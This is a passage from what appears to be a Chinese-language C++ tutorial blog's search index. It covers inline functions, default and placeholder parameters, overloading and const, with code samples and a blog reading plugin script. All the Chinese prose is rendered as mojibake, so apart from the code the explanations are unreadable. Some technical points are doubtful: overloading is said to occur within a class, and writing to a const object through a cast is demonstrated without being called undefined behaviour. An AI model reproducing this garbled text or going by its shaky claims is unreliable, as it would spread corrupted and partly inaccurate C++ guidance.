ã€å­˜å‚¨å‡½æ•°è¿”å›å€¼ç­‰è¿‡ç¨‹ï¼›å½“å‡½æ•°æ‰§è¡Œå®Œåï¼Œå†è·å–ä¹‹å‰æ­£åœ¨è°ƒç”¨çš„å‡½æ•°çš„åœ°å€ï¼Œå›å»ç»§ç»­æ‰§è¡Œé‚£ä¸ªå‡½æ•°ï¼Œè¿è¡Œæ—¶é—´å¼€é”€ç®€ç›´å¤ªå¤šäº†ã€‚ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼ŒC++ å†…è”å‡½æ•°æä¾›äº†æ›¿ä»£å‡½æ•°è°ƒç”¨çš„æ–¹æ¡ˆï¼Œé€šè¿‡ inline å£°æ˜ï¼Œç¼–è¯‘å™¨é¦–å…ˆåœ¨å‡½æ•°è°ƒç”¨å¤„ä½¿ç”¨å‡½æ•°ä½“æœ¬èº«è¯­å¥æ›¿æ¢äº†å‡½æ•°è°ƒç”¨è¯­å¥ï¼Œç„¶åç¼–è¯‘æ›¿æ¢åçš„ä»£ç ã€‚å› æ­¤ï¼Œé€šè¿‡å†…è”å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¸éœ€è¦è·³è½¬åˆ°å†…å­˜å…¶ä»–åœ°å€å»æ‰§è¡Œå‡½æ•°è°ƒç”¨ï¼Œä¹Ÿä¸éœ€è¦ä¿ç•™å‡½æ•°è°ƒç”¨æ—¶çš„ç°åœºæ•°æ®ã€‚ å¦‚ä½•ä½¿ç”¨å†…è”å‡½æ•°12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;// å®å®šä¹‰å‡½æ•°çš„å£°æ˜#define MAXFUNC(x, y) (x &gt; y) ? x : y// å†…è”å‡½æ•°çš„å£°æ˜inline int Max(int x, int y) { return (x &gt; y) ? x : y;}int main() { // å†…è”å‡½æ•°çš„è°ƒç”¨ cout &lt;&lt; "Max (20,10): " &lt;&lt; Max(20, 10) &lt;&lt; endl; cout &lt;&lt; "Max (0,200): " &lt;&lt; Max(0, 200) &lt;&lt; endl; cout &lt;&lt; "Max (100,1010): " &lt;&lt; Max(100, 1010) &lt;&lt; endl; // å®å®šä¹‰å‡½æ•°çš„è°ƒç”¨ printf("Max (10,30): %d\\n", MAXFUNC(10, 30)); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1234Max (20,10): 20Max (0,200): 200Max (100,1010): 1010Max (10,30): 30 å†…è”å‡½æ•°çš„ä¼˜ç¼ºç‚¹ä¼˜ç‚¹ï¼š å®ƒé€šè¿‡é¿å…å‡½æ•°è°ƒç”¨æ‰€å¸¦æ¥çš„å¼€é”€æ¥æé«˜ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ é€šè¿‡å°†å‡½æ•°å£°æ˜ä¸ºå†…è”ï¼Œåˆ™å¯ä»¥æŠŠå‡½æ•°å®šä¹‰æ”¾åœ¨å¤´æ–‡ä»¶å†… å®ƒé¿å…äº†æ™®é€šå‡½æ•°è°ƒç”¨æ—¶çš„é¢å¤–å¼€é”€ï¼ˆå‹æ ˆã€å¼¹æ ˆã€è·³è½¬ã€è¿”å›ï¼‰ ç¼ºç‚¹ï¼š å› ä¸ºä»£ç çš„æ‰©å±•ï¼Œå†…è”å‡½æ•°å¢å¤§äº†å¯æ‰§è¡Œç¨‹åºçš„ä½“ç§¯ C++ å†…è”å‡½æ•°çš„å±•å¼€æ˜¯ç¼–è¯‘é˜¶æ®µï¼Œè¿™å°±æ„å‘³ç€å¦‚æœå†…è”å‡½æ•°å‘ç”Ÿäº†æ”¹åŠ¨ï¼Œé‚£ä¹ˆå°±éœ€è¦é‡æ–°ç¼–è¯‘ä»£ç  å½“æŠŠå†…è”å‡½æ•°æ”¾åœ¨å¤´æ–‡ä»¶ä¸­æ—¶ï¼Œå®ƒå°†ä¼šä½¿å¤´æ–‡ä»¶ä¿¡æ¯å˜å¤šï¼Œä¸è¿‡å¤´æ–‡ä»¶çš„ä½¿ç”¨è€…ä¸ç”¨åœ¨æ„è¿™äº›ç»†èŠ‚ æœ‰æ—¶å€™å†…è”å‡½æ•°å¹¶ä¸å—åˆ°é’çï¼Œæ¯”å¦‚åœ¨åµŒå…¥å¼ç³»ç»Ÿä¸­ï¼ŒåµŒå…¥å¼ç³»ç»Ÿçš„å­˜å‚¨çº¦æŸå¯èƒ½ä¸å…è®¸ä½“ç§¯å¾ˆå¤§çš„å¯æ‰§è¡Œç¨‹åºè¿è¡Œ å†…è”å‡½æ•°çš„ç¼–è¯‘é™åˆ¶C++ ä¸­å†…è”å‡½æ•°ç¼–è¯‘çš„é™åˆ¶ï¼š å‡½æ•°ä½“ä¸èƒ½è¿‡äºåºå¤§ ä¸èƒ½å¯¹å‡½æ•°è¿›è¡Œå–å€æ“ä½œ ä¸èƒ½å­˜åœ¨ä»»ä½•å½¢å¼çš„å¾ªç¯è¯­å¥ ä¸èƒ½å­˜åœ¨è¿‡å¤šçš„æ¡ä»¶åˆ¤æ–­è¯­å¥ å‡½æ•°çš„å†…è”å£°æ˜å¿…é¡»åœ¨è°ƒç”¨è¯­å¥ä¹‹å‰ ç¼–è¯‘å™¨å¯¹äºå†…è”å‡½æ•°çš„é™åˆ¶å¹¶ä¸æ˜¯ç»å¯¹çš„ï¼Œå†…è”å‡½æ•°ç›¸å¯¹äºæ™®é€šå‡½æ•°çš„ä¼˜åŠ¿åªæ˜¯çœå»äº†å‡½æ•°è°ƒç”¨æ—¶å‹æ ˆã€å¼¹æ ˆã€è·³è½¬å’Œè¿”å›çš„å¼€é”€ã€‚å› æ­¤ï¼Œå½“å‡½æ•°ä½“çš„æ‰§è¡Œå¼€é”€è¿œå¤§äºå‹æ ˆã€å¼¹æ ˆã€è·³è½¬å’Œè¿”å›æ‰€ç”¨çš„å¼€é”€æ—¶ï¼Œé‚£ä¹ˆå†…è”å°†å˜å¾—æ¯«æ— æ„ä¹‰ã€‚ ä»€ä¹ˆæ—¶å€™è¯¥ä½¿ç”¨å†…è”å‡½æ•°å½“ç¨‹åºè®¾è®¡éœ€è¦æ—¶ï¼Œæ¯ä¸ªå‡½æ•°éƒ½å¯ä»¥å£°æ˜ä¸º inlineï¼Œä¸‹é¢åˆ—ä¸¾ä¸€äº›æœ‰ç”¨çš„å»ºè®®ï¼š å½“å¯¹ç¨‹åºæ‰§è¡Œæ€§èƒ½æœ‰è¦æ±‚æ—¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨å†…è”å‡½æ•° å½“æƒ³ä½¿ç”¨å®å®šä¹‰ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œé‚£å°±æœæ–­ä½¿ç”¨å†…è”å‡½æ•°æ¥æ›¿ä»£ åœ¨ç±»å†…éƒ¨å®šä¹‰çš„å‡½æ•°ä¼šé»˜è®¤å£°æ˜ä¸º inline å‡½æ•°ï¼Œè¿™æœ‰åˆ©äºç±»å®ç°ç»†èŠ‚çš„éšè— å…³é”®ç‚¹ï¼š è™šå‡½æ•°ä¸å…è®¸å†…è” æ‰€æœ‰åœ¨ç±»ä¸­å®šä¹‰çš„å‡½æ•°éƒ½é»˜è®¤å£°æ˜ä¸º inline å‡½æ•°ï¼Œæ‰€æœ‰ä¸ç”¨å†æ˜¾ç¤ºåœ°å»å£°æ˜ inline è™½ç„¶è¯´æ¨¡æ¿å‡½æ•°æ”¾ä¸­å¤´æ–‡ä»¶ä¸­ï¼Œä½†å®ƒä»¬ä¸ä¸€å®šæ˜¯å†…è”çš„ï¼ˆä¸æ˜¯è¯´å®šä¹‰åœ¨å¤´æ–‡ä»¶ä¸­çš„å‡½æ•°éƒ½æ˜¯å†…è”å‡½æ•°ï¼‰ C++ ç¼–è¯‘å™¨ä¼šç›´æ¥å°†ç¼–è¯‘åçš„å†…è”å‡½æ•°ä½“æ’å…¥åˆ°è°ƒç”¨çš„åœ°æ–¹ï¼Œå†…è”å‡½æ•°åœ¨æœ€ç»ˆç”Ÿæˆçš„ä»£ç ä¸­æ˜¯æ²¡æœ‰å®šä¹‰çš„ å†…è”å‡½æ•°ç”±ç¼–è¯‘å™¨å¤„ç†ï¼Œç›´æ¥å°†ç¼–è¯‘åçš„å†…è”å‡½æ•°ä½“æ’å…¥åˆ°è°ƒç”¨çš„åœ°æ–¹ï¼›è€Œå®å®šä¹‰ç”±é¢„å¤„ç†å™¨å¤„ç†ï¼Œåªè¿›è¡Œç®€å•çš„æ–‡æœ¬æ›¿æ¢ï¼Œæ²¡æœ‰ä»»ä½•ç¼–è¯‘è¿‡ç¨‹ ä¸€äº›ç°ä»£çš„ C++ ç¼–è¯‘å™¨æä¾›äº†æ‰©å±•è¯­æ³•ï¼Œèƒ½å¤Ÿå¯¹å‡½æ•°è¿›è¡Œå¼ºåˆ¶å†…è”ï¼Œä¾‹å¦‚ï¼š g++ ä¸­çš„ __attribute__((always_inline)) å±æ€§ ç¼–è¯‘å™¨çš„å†…è”çœ‹èµ·æ¥å°±åƒæ˜¯ä»£ç çš„å¤åˆ¶ä¸ç²˜è´´ï¼Œä½†è¿™ä¸é¢„å¤„ç†å®æ˜¯å¾ˆä¸åŒçš„ï¼›å®å®šä¹‰å‡½æ•°æ˜¯å¼ºåˆ¶çš„å†…è”å±•å¼€ï¼Œå¯èƒ½å°†ä¼šæ±¡æŸ“æ‰€æœ‰çš„å‘½åç©ºé—´ä¸ä»£ç ï¼Œä¼šä¸ºç¨‹åºçš„è°ƒè¯•å¸¦æ¥å›°éš¾ å†…è”å£°æ˜åªæ˜¯ä¸€ç§å¯¹ç¼–è¯‘å™¨çš„å»ºè®®ï¼Œç¼–è¯‘å™¨æ˜¯å¦é‡‡ç”¨å†…è”æªæ–½ç”±ç¼–è¯‘å™¨è‡ªå·±æ¥å†³å®šã€‚ç°ä»£ C++ ç¼–è¯‘å™¨èƒ½å¤Ÿè¿›è¡Œç¼–è¯‘ä¼˜åŒ–ï¼Œç”šè‡³åœ¨æ±‡ç¼–é˜¶æ®µæˆ–é“¾æ¥é˜¶æ®µï¼Œä¸€äº›æ²¡æœ‰ inline å£°æ˜çš„å‡½æ•°ï¼Œä¹Ÿå¯èƒ½è¢«ç¼–è¯‘å™¨å†…è”ç¼–è¯‘ å‡½æ•°é»˜è®¤å‚æ•°C++ ä¸­å¯ä»¥åœ¨å‡½æ•°å£°æ˜æ—¶ä¸ºå‚æ•°æä¾›ä¸€ä¸ªé»˜è®¤å€¼ï¼Œå½“å‡½æ•°è°ƒç”¨æ—¶æ²¡æœ‰æŒ‡å®šè¿™ä¸ªå‚æ•°çš„å€¼ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç”¨é»˜è®¤å€¼ä»£æ›¿ã€‚å‡½æ•°é»˜è®¤å‚æ•°çš„ä½¿ç”¨è§„åˆ™å¦‚ä¸‹ï¼š åªæœ‰å‚æ•°åˆ—è¡¨åé¢éƒ¨åˆ†çš„å‚æ•°æ‰å¯ä»¥æä¾›é»˜è®¤å‚æ•°å€¼ ä¸€æ—¦åœ¨ä¸€ä¸ªå‡½æ•°è°ƒç”¨ä¸­å¼€å§‹ä½¿ç”¨é»˜è®¤å‚æ•°å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªå‚æ•°åçš„æ‰€æœ‰å‚æ•°éƒ½å¿…é¡»ä½¿ç”¨é»˜è®¤å‚æ•°å€¼ 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;void funcA(int x = 3) { printf("x: %d\\n", x);}void funcB(int a, int b, int y = 4, int z = 5) { printf("a: %d, b: %d, y: %d, z: %d\\n", a, b, y, z);}int main() { funcA(); funcA(6); funcB(1, 2); funcB(1, 2, 3, 4); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1234x: 3x: 6a: 1, b: 2, y: 4, z: 5a: 1, b: 2, y: 3, z: 4 å‡½æ•°å ä½å‚æ•°å‡½æ•°å ä½å‚æ•°åªæœ‰å‚æ•°ç±»å‹å£°æ˜ï¼Œè€Œæ²¡æœ‰å‚æ•°åå£°æ˜ï¼›ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåœ¨å‡½æ•°ä½“å†…éƒ¨æ— æ³•ä½¿ç”¨å ä½å‚æ•°ã€‚ 123456789101112#include &lt;iostream&gt;using namespace std;int func(int a, int b, int) { return a + b;}int main() { printf("func(1, 2, 3) = %d\\n", func(1, 2, 3)); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1func(1, 2, 3) = 3 å‡½æ•°é»˜è®¤å‚æ•°ç»“åˆå‡½æ•°å ä½å‚æ•° å¯ä»¥å°†å‡½æ•°é»˜è®¤å‚æ•°ä¸å‡½æ•°å ä½å‚æ•°ç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œå…¶æ„ä¹‰åœ¨äºä¸ºä»¥åç¨‹åºçš„æ‰©å±•ç•™ä¸‹ç©ºé—´ï¼Œå¹¶å…¼å®¹ C è¯­è¨€ä»£ç ä¸­å¯èƒ½å‡ºç°çš„ä¸è§„èŒƒå†™æ³•ã€‚ 12345678910111213#include &lt;iostream&gt;using namespace std;void func(int a, int b, int = 0) { printf("a + b = %d\\n", a + b);}int main() { func(1, 2); func(1, 2, 3); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12a + b = 3a + b = 3 å‡½æ•°é‡è½½å‡½æ•°é‡è½½çš„æ¦‚å¿µå‡½æ•°é‡è½½æ¦‚å¿µï¼ˆFunction Overloadï¼‰ï¼š ç”¨åŒä¸€ä¸ªå‡½æ•°åå®šä¹‰ä¸åŒçš„å‡½æ•° å½“å‡½æ•°åå’Œä¸åŒçš„å‚æ•°æ­é…æ—¶å‡½æ•°çš„å«ä¹‰ä¸åŒ å‡½æ•°é‡è½½è‡³å°‘æ»¡è¶³ä¸‹é¢çš„ä¸€ä¸ªæ¡ä»¶ï¼ˆå‡½æ•°é‡è½½çš„åˆ¤æ–­æ ‡å‡†ï¼‰ï¼š å‚æ•°ä¸ªæ•°ä¸åŒ å‚æ•°ç±»å‹ä¸åŒ å‚æ•°é¡ºåºä¸åŒ ç‰¹åˆ«æ³¨æ„ï¼š å‡½æ•°çš„è¿”å›å€¼ä¸æ˜¯å‡½æ•°é‡è½½çš„åˆ¤æ–­æ ‡å‡† å‡½æ•°é‡è½½çš„ä½¿ç”¨12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;int func(int x) { return x;}int func(int a, int b) { return a + b;}int func(const char *s) { return strlen(s);}int main() { int c = 0; c = func(1); printf("c = %d\\n", c); c = func(1, 2); printf("c = %d\\n", c); c = func("12345"); printf("c = %d\\n", c); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123c = 1c = 3c = 5 å‡½æ•°é‡è½½çš„è°ƒç”¨å‡†åˆ™ç¼–è¯‘å™¨è°ƒç”¨é‡è½½å‡½æ•°çš„å‡†åˆ™ï¼š å°†æ‰€æœ‰åŒåå‡½æ•°ä½œä¸ºå€™é€‰è€… å°è¯•å¯»æ‰¾å¯è¡Œçš„å€™é€‰å‡½æ•° ç²¾ç¡®åŒ¹é…å®å‚ é€šè¿‡é»˜è®¤å‚æ•°èƒ½å¤ŸåŒ¹é…å®å‚ é€šè¿‡é»˜è®¤ç±»å‹è½¬æ¢åŒ¹é…å®å‚ åŒ¹é…å¤±è´¥ æœ€ç»ˆå¯»æ‰¾åˆ°çš„å¯è¡Œå€™é€‰å‡½æ•°ä¸å”¯ä¸€ï¼Œåˆ™å‡ºç°äºŒä¹‰æ€§ï¼Œç¼–è¯‘å¤±è´¥ æ— æ³•åŒ¹é…æ‰€æœ‰å€™é€‰è€…ï¼Œå‡½æ•°æœªå®šä¹‰ï¼Œç¼–è¯‘å¤±è´¥ å‡½æ•°é‡è½½çš„æ³¨æ„äº‹é¡¹ï¼š é‡è½½å‡½æ•°çš„å‡½æ•°ç±»å‹æ˜¯ä¸åŒçš„ å‡½æ•°é‡è½½æ˜¯å‘ç”Ÿåœ¨ä¸€ä¸ªç±»ä¸­é‡Œé¢çš„ å‡½æ•°çš„è¿”å›å€¼ä¸èƒ½ä½œä¸ºå‡½æ•°é‡è½½çš„ä¾æ® å‡½æ•°é‡è½½æ˜¯ç”±å‡½æ•°åå’Œå‚æ•°åˆ—è¡¨å†³å®šçš„ é‡è½½å‡½æ•°åœ¨æœ¬è´¨ä¸Šæ˜¯ç›¸äº’ç‹¬ç«‹çš„ä¸åŒå‡½æ•° å‡½æ•°é‡è½½ä¸å‡½æ•°æŒ‡é’ˆå½“ä½¿ç”¨é‡è½½å‡½æ•°åå¯¹å‡½æ•°æŒ‡é’ˆè¿›è¡Œèµ‹å€¼æ—¶ï¼š æ ¹æ®é‡è½½è§„åˆ™æŒ‘é€‰ä¸å‡½æ•°æŒ‡é’ˆå‚æ•°åˆ—è¡¨ä¸€è‡´çš„å€™é€‰è€… ä¸¥æ ¼åŒ¹é…å€™é€‰è€…çš„å‡½æ•°ç±»å‹ä¸å‡½æ•°æŒ‡é’ˆçš„å‡½æ•°ç±»å‹ 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;int func(int x) { return x;}int func(int a, int b) { return a + b;}int func(const char *s) { return strlen(s);}// ç¬¬ä¸€ç§å†™æ³•ï¼šå£°æ˜å‡½æ•°ç±»å‹typedef int (FUNC)(int a);// ç¬¬äºŒç§å†™æ³•ï¼šå£°æ˜å‡½æ•°æŒ‡é’ˆç±»å‹typedef int(*PFUNC)(int a, int b);int main() { // æ ¹æ®ä¸Šé¢çš„ç¬¬ä¸€ç§å†™æ³•ï¼Œå®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹çš„å˜é‡ FUNC *FUNC = func; int c = FUNC(1); printf("c = %d\\n", c); // æ ¹æ®ä¸Šé¢çš„ç¬¬äºŒç§å†™æ³•ï¼Œå®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹çš„å˜é‡ PFUNC p = func; int d = p(3, 4); printf("d = %d\\n", d); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12c = 1d = 7 å‡½æ•°é‡è½½ä¸å‡½æ•°é»˜è®¤å‚æ•°å½“å‡½æ•°é‡è½½é‡ä¸Šå‡½æ•°é»˜è®¤å‚æ•°æ—¶ï¼Œå¦‚æœä»£ç å­˜åœ¨äºŒä¹‰æ€§ï¼Œé‚£ä¹ˆ C++ ç¼–è¯‘å™¨ä¼šç¼–è¯‘å¤±è´¥ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int func(int a, int b, int c = 0) { return a * b * c;}int func(int a, int b) { return a + b;}int func(int a) { return a;}int main() { int c = 0; // c = func(1, 2); // å­˜åœ¨äºŒä¹‰æ€§ï¼Œè°ƒç”¨å¤±è´¥ï¼Œç¼–è¯‘ä¸èƒ½é€šè¿‡ printf("c = %d\\n", c); return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ å…¥é—¨åŸºç¡€ä¹‹äºŒ",url:"/posts/b03c11a0.html",text:'const å…³é”®å­—const ç®€ä»‹const æ˜¯ constant çš„ç¼©å†™ï¼Œæœ¬æ„æ˜¯ä¸å˜çš„ï¼Œä¸æ˜“æ”¹å˜çš„æ„æ€ã€‚åœ¨ C++ ä¸­æ˜¯ç”¨æ¥ä¿®é¥°å†…ç½®ç±»å‹å˜é‡ã€è‡ªå®šä¹‰å¯¹è±¡ã€æˆå‘˜å‡½æ•°ã€è¿”å›å€¼ã€å‡½æ•°å‚æ•°ã€‚C++ çš„ const å…³é”®å­—å…è®¸æŒ‡å®šä¸€ä¸ªè¯­ä¹‰çº¦æŸï¼Œç¼–è¯‘å™¨ä¼šå¼ºåˆ¶å®æ–½è¿™ä¸ªçº¦æŸï¼Œå…è®¸ç¨‹åºå‘˜å‘Šè¯‰ç¼–è¯‘å™¨æŸå€¼æ˜¯ä¿æŒä¸å˜çš„ã€‚å¦‚æœåœ¨ç¼–ç¨‹ä¸­ç¡®å®æœ‰æŸä¸ªå€¼ä¿æŒä¸å˜ï¼Œå°±åº”è¯¥æ˜ç¡®ä½¿ç”¨ constï¼Œè¿™æ ·å¯ä»¥è·å¾—ç¼–è¯‘å™¨çš„å¸®åŠ©ã€‚ 1234567891011#include &lt;iostream&gt;using namespace std;int main() { const int a = 7; int *p = (int *) &amp;a; *p = 8; cout &lt;&lt; a &lt;&lt; " "&lt;&lt; *p; return 0;} åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œå¯¹äº const å˜é‡ aï¼Œæˆ‘ä»¬å–å˜é‡çš„åœ°å€å¹¶è½¬æ¢èµ‹å€¼ç»™ æŒ‡å‘ int çš„æŒ‡é’ˆï¼Œç„¶ååˆ©ç”¨ *p = 8; é‡æ–°èµ‹å€¼ï¼Œç„¶åè¾“å‡ºæŸ¥çœ‹ a çš„å€¼ï¼Œç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 17 8 ä»ç»“æœä¸­å¯ä»¥çœ‹åˆ°ï¼Œç¼–è¯‘å™¨è®¤ä¸º a çš„å€¼ä¸ºä¸€å¼€å§‹å®šä¹‰çš„ 7ï¼Œæ‰€ä»¥å¯¹ const a çš„æ“ä½œå°±ä¼šäº§ç”Ÿä¸Šé¢çš„æƒ…å†µã€‚æ‰€ä»¥åƒä¸‡ä¸è¦è½»æ˜“å¯¹ const å˜é‡èµ‹å€¼ï¼Œè¿™ä¼šäº§ç”Ÿæ„æƒ³ä¸åˆ°çš„è¡Œä¸ºã€‚C++ ç¼–è¯‘å™¨å¯¹ const å¸¸é‡çš„å¤„ç†æœºåˆ¶æ˜¯ï¼Œå½“ç¢°è§å¸¸é‡å£°æ˜æ—¶ï¼Œå¾€ç¬¦å·è¡¨ä¸­æ”¾å…¥å¸¸é‡ï¼›åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­è‹¥å‘ç°ä½¿ç”¨å¸¸é‡ï¼Œåˆ™ç›´æ¥ä»¥ç¬¦å·è¡¨ä¸­çš„å€¼æ›¿æ¢ï¼Œä¾‹å¦‚åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­è‹¥å‘ç°å¯¹ const å¸¸é‡ä½¿ç”¨äº† extern æˆ–è€… &amp; æ“ä½œç¬¦ï¼Œåˆ™ä¼šç»™å¯¹åº”çš„å¸¸é‡å•ç‹¬åˆ†é…å†…å­˜ç©ºé—´ï¼ˆå…¼å®¹ C è¯­è¨€ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯ä¸Šè¿°ä»£ç ä¸­æ‰“å° *p çš„å€¼ä¸º 8 çš„åŸå› ï¼Œç‚¹å‡»æŸ¥çœ‹åŸç†åˆ†æå›¾ã€‚ å¦‚æœä¸æƒ³è®©ç¼–è¯‘å™¨å¯Ÿè§‰åˆ°ä¸Šé¢å¯¹ const å˜é‡çš„æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ const å‰é¢åŠ ä¸Š volatile å…³é”®å­—ã€‚volatile å…³é”®å­—è·Ÿ const åˆšå¥½ç›¸åï¼Œæ˜¯æ˜“å˜çš„ï¼Œå®¹æ˜“æ”¹å˜çš„æ„æ€ï¼›æ‰€ä»¥ä¸ä¼šè¢«ç¼–è¯‘å™¨ä¼˜åŒ–ï¼Œç¼–è¯‘å™¨ä¹Ÿå°±ä¸ä¼šæ”¹å˜å¯¹ a å˜é‡çš„æ“ä½œã€‚ 1234567891011#include&lt;iostream&gt;using namespace std;int main() { volatile const int a = 7; int *p = (int *) &amp;a; *p = 8; cout &lt;&lt; a &lt;&lt; " " &lt;&lt; *p; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 18 8 const å‚æ•°ä¼ é€’å¯¹äº const ä¿®é¥°å‡½æ•°å‚æ•°å¯ä»¥åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š Aï¼šå€¼ä¼ é€’çš„ const ä¿®é¥°ä¼ é€’ï¼Œä¸€èˆ¬è¿™ç§æƒ…å†µä¸éœ€è¦ const ä¿®é¥°ï¼Œå› ä¸ºå‡½æ•°ä¼šè‡ªåŠ¨äº§ç”Ÿä¸´æ—¶å˜é‡å¤åˆ¶å®å‚å€¼ã€‚ 123456789101112131415#include &lt;iostream&gt;using namespace std;void Cpf(const int a){ cout &lt;&lt; a; // ++a; æ˜¯é”™è¯¯å†™æ³•ï¼Œa ä¸èƒ½è¢«æ”¹å˜}int main(){ Cpf(8); return 0;} Bï¼šå½“ const å‚æ•°ä¸ºæŒ‡é’ˆæ—¶ï¼Œå¯ä»¥é˜²æ­¢æŒ‡é’ˆè¢«æ„å¤–ç¯¡æ”¹ã€‚ 123456789101112131415#include &lt;iostream&gt;using namespace std;void Cpf(int *const a) { cout &lt;&lt; *a &lt;&lt; endl; // a ä¸º 8 *a = 9;}int main() { int a = 8; Cpf(&amp;a); cout &lt;&lt; a &lt;&lt; endl; // a ä¸º 9 return 0;} Cï¼šè‡ªå®šä¹‰ç±»å‹çš„å‚æ•°ä¼ é€’ï¼Œéœ€è¦ä½¿ç”¨ä¸´æ—¶å¯¹è±¡å¤åˆ¶å‚æ•°ï¼Œå¯¹äºä¸´æ—¶å¯¹è±¡çš„æ„é€ ï¼Œéœ€è¦è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼Œæ¯”è¾ƒæµªè´¹èµ„æºï¼Œå› æ­¤å¯ä»¥é‡‡å– const å¤–åŠ å¼•ç”¨ä¼ é€’çš„æ–¹å¼ã€‚å¹¶ä¸”å¯¹äºä¸€èˆ¬çš„ intã€double ç­‰å†…ç½®ç±»å‹ï¼Œä¸éœ€è¦é‡‡ç”¨å¼•ç”¨çš„ä¼ é€’æ–¹å¼ã€‚ 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;class Test {private: int _cm;public: Test() {} Test(int _m) : _cm(_m) {} int get_cm() const { return _cm; }};void Cmf(const Test &amp; _tt) { cout &lt;&lt; _tt.get_cm();}int main() { Test t(8); Cmf(t); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 18 const å‡½æ•°è¿”å›å€¼å¯¹äº const ä¿®é¥°å‡½æ•°çš„è¿”å›å€¼å¯ä»¥åˆ†ä¸‰ç§æƒ…å†µï¼š Aï¼šconst ä¿®é¥°å†…ç½®ç±»å‹ï¼ˆå¦‚ intã€doubleï¼‰çš„è¿”å›å€¼ï¼Œä¿®é¥°ä¸ä¸ä¿®é¥°è¿”å›å€¼çš„ä½œç”¨éƒ½ä¸€æ ·ã€‚ 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;const int Cmf() { return 1;}int Cpf() { return 0;}int main() { int _m = Cmf(); int _n = Cpf(); cout &lt;&lt; _m &lt;&lt; " " &lt;&lt; _n; // è¾“å‡ºç»“æœä¸ºï¼š1 0 return 0;} Bï¼šconst ä¿®é¥°è‡ªå®šä¹‰ç±»å‹çš„ä½œä¸ºè¿”å›å€¼ï¼Œæ­¤æ—¶è¿”å›çš„å€¼ä¸èƒ½ä½œä¸ºå·¦å€¼ä½¿ç”¨ï¼Œæ—¢ä¸èƒ½è¢«èµ‹å€¼ï¼Œä¹Ÿä¸èƒ½è¢«ä¿®æ”¹ã€‚ Cï¼šconst ä¿®é¥°è¿”å›çš„æŒ‡é’ˆæˆ–è€…å¼•ç”¨ï¼Œæ˜¯å¦è¿”å›ä¸€ä¸ªæŒ‡å‘ const çš„æŒ‡é’ˆï¼Œå–å†³äºæˆ‘ä»¬æƒ³è®©ç”¨æˆ·å¹²ä»€ä¹ˆã€‚ const ä¿®é¥°æŒ‡é’ˆå˜é‡const ä¿®é¥°æŒ‡é’ˆå˜é‡æœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š Aï¼š const ä¿®é¥°æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œåˆ™å†…å®¹ä¸ºä¸å¯å˜é‡ã€‚ Bï¼š const ä¿®é¥°æŒ‡é’ˆï¼Œåˆ™æŒ‡é’ˆä¸ºä¸å¯å˜é‡ã€‚ Cï¼š const ä¿®é¥°æŒ‡é’ˆå’ŒæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œåˆ™æŒ‡é’ˆå’ŒæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹éƒ½ä¸ºä¸å¯å˜é‡ã€‚ å¯¹äº Aï¼Œåˆ™æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ä¸å¯æ”¹å˜ï¼Œç®€ç§°å·¦å®šå€¼ï¼Œå› ä¸º const ä½äº * å·çš„å·¦è¾¹ã€‚ 12345int a = 10;int b = 20;const int *p = &amp;a;p = &amp;b; // æ­£ç¡®å†™æ³•*p = 10; 